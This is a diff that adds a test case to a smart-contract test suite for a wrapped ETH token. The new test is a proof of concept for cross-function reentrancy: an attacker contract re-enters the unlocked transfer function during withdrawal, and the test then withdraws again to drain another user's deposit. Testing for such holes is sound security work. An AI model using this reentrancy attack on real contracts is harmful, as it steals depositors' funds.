@@ -55,6 +55,33 @@ describe("WrappedTokenV4B", function () {
         "ETH transfer failed",
       );
     });
+
+    it("[vulnerability]", async function () {
+      // the attacker re-enters transfer, which is not locked, and moves its tokens out before they are burned
+      const attacker = await ethers.deployContract("CrossFunctionReentrancyAttacker", [await token.getAddress()], bob);
+
+      const contractEthBalanceBefore = await ethers.provider.getBalance(token.getAddress());
+      const bobEthBalanceBefore = await ethers.provider.getBalance(bob.address);
+
+      // Bob gets his 5 ETH back and still holds 5 tokens
+      const attackTx = await attacker.connect(bob).attack({ value: amount });
+      const attackReceipt = await attackTx.wait();
+      expect(await token.balanceOf(bob.address)).to.equal(amount);
+
+      // Bob withdraws again with the same tokens and takes Alice's deposit
+      const withdrawTx = await token.connect(bob).withdraw();
+      const withdrawReceipt = await withdrawTx.wait();
+      const gasUsed = attackReceipt!.fee + withdrawReceipt!.fee;
+
+      const contractEthBalanceAfter = await ethers.provider.getBalance(token.getAddress());
+      expect(contractEthBalanceAfter).to.equal(0n);
+
+      const bobEthBalanceAfter = await ethers.provider.getBalance(bob.address);
+      expect(bobEthBalanceAfter).to.equal(bobEthBalanceBefore + contractEthBalanceBefore - gasUsed);
+
+      // Alice's balance is still recorded, but there is no ETH left to pay it
+      expect(await token.balanceOf(alice.address)).to.equal(amount);
+    });
   });
 
   describe("emergencyWithdraw", function () {
